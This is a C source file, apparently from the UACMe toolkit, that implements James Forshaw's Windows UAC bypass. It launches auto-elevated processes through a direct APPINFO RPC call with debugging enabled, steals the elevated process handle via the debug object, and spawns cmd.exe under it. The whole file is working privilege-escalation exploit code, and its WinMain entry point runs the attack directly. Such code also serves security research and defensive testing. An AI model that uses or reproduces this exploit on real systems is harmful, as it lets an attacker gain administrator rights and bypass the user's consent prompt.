/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2020B
*
*  TITLE:       TYRANID.C
*
*  VERSION:     3.54
*
*  DATE:        24 Nov 2020
*
*  James Forshaw autoelevation method(s)
*  Fine Dinning Tool (c) CIA
*
*  For description please visit original URL
*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
*  https://tyranidslair.blogspot.com/2019/02/accessing-access-tokens-for-uiaccess.html
*  https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "ntlib/util.h"
#include <windows.h>
#include <rpc.h>
#include "aic.c"

/*
* ucmxCreateProcessFromParent
*
* Purpose:
*
* Create new process using parent process handle.
*
*/
NTSTATUS ucmxCreateProcessFromParent( _In_ HANDLE parentHandle, _In_ LPWSTR pathToExe) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0x30;
    STARTUPINFOEX si{ 0 };
    PROCESS_INFORMATION pi{ 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEX);
    *(PVOID*)(&si.lpAttributeList) = malloc(size);

    if (si.lpAttributeList) {

        if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
            if (UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), 0, 0))
            {
                si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                si.StartupInfo.wShowWindow = SW_SHOW;

                if (CreateProcess(
                    0, pathToExe, 0, 0, 0, CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT, 0, 
                    LPWSTR(L"C:/Windows/System32"), (LPSTARTUPINFO)&si, &pi)) {
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                    status = STATUS_SUCCESS;
                }
            }
        }

        if (si.lpAttributeList)
            DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

        free(si.lpAttributeList);
    }
    
    return status;
}


/*
* ucmDebugObjectMethod
*
* Purpose:
*
* Bypass UAC by direct RPC call to APPINFO and DebugObject use.
*
*/
NTSTATUS ucmDebugObjectMethod(_In_ LPWSTR lpszPayload) {
    NTSTATUS status = STATUS_ACCESS_DENIED;
    HANDLE dbgHandle = NULL, dbgProcessHandle, dupHandle;
    PROCESS_INFORMATION procInfo;
    DEBUG_EVENT dbgEvent;
    WCHAR szProcess[MAX_PATH * 2];

        lstrcpyW(szProcess, L"C:\\Windows\\System32\\winver.exe");

        if (!AicLaunchAdminProcess(szProcess,
            szProcess,
            0,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            (LPWSTR)L"C:\\Windows\\System32",
            (LPWSTR)L"WinSta0\\Default",
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo)) return  STATUS_UNSUCCESSFUL;


        //
        // Capture debug object handle.
        //
        status = NtQueryInformationProcess(
            procInfo.hProcess,
            ProcessDebugObjectHandle,
            &dbgHandle,
            sizeof(HANDLE),
            NULL);

        if (!NT_SUCCESS(status)) {
            TerminateProcess(procInfo.hProcess, 0);
            CloseHandle(procInfo.hThread);
            CloseHandle(procInfo.hProcess);
            return  STATUS_UNSUCCESSFUL;
        }

        //
        // Detach debug and kill non elevated victim process.
        //
        ((void(NTAPI*)(HANDLE, HANDLE))GetProcAddress(LoadLibraryA("ntdll"), "NtRemoveProcessDebug"))(procInfo.hProcess, dbgHandle);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hThread);
        CloseHandle(procInfo.hProcess);

        lstrcpyW(szProcess, L"C:\\Windows\\System32\\computerdefaults.exe");
        RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
        RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));

        if (!AicLaunchAdminProcess(szProcess,
            szProcess,
            1,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            (LPWSTR)L"C:\\Windows\\System32",
            (LPWSTR)(L"WinSta0\\Default"),
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo)) return STATUS_UNSUCCESSFUL;

        //
        // Update thread TEB with debug object handle to receive debug events.
        //
        ((void(NTAPI*)(HANDLE))GetProcAddress(LoadLibraryA("ntdll"), "DbgUiSetThreadDebugObject"))(dbgHandle);
        dbgProcessHandle = NULL;

        //
        // Debugger wait cycle.
        //
        while (1) {

            if (!WaitForDebugEvent(&dbgEvent, INFINITE))  break;

            switch (dbgEvent.dwDebugEventCode) {
                case CREATE_PROCESS_DEBUG_EVENT:
                    dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
                    break;
            }

            if (dbgProcessHandle) break;
            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
        }

        if (dbgProcessHandle == NULL) return false;

        //
        // Create new handle from captured with PROCESS_ALL_ACCESS.
        //
        dupHandle = NULL;
        status = NtDuplicateObject(dbgProcessHandle,
            NtCurrentProcess(),
            NtCurrentProcess(),
            &dupHandle,
            PROCESS_ALL_ACCESS,
            0,
            0);

        if (NT_SUCCESS(status)) {
            //
            // Run new process with parent set to duplicated process handle.
            //
            ucmxCreateProcessFromParent(dupHandle, lpszPayload);
            NtClose(dupHandle);
        }

#pragma warning(push)
#pragma warning(disable: 6387)
        ((void(NTAPI*)(HANDLE))GetProcAddress(LoadLibraryA("ntdll"), "DbgUiSetThreadDebugObject"))(0);
#pragma warning(pop)

        NtClose(dbgHandle);
        dbgHandle = NULL;

        CloseHandle(dbgProcessHandle);

        //
        // Release victim process.
        //
        CloseHandle(procInfo.hThread);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hProcess);

    if (dbgHandle) NtClose(dbgHandle);
    return status;
}


int WinMain(HINSTANCE, HINSTANCE, char*, int) {
    if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) return -1;
    wchar_t buff[] = L"cmd.exe";
    return ucmDebugObjectMethod(buff);
}
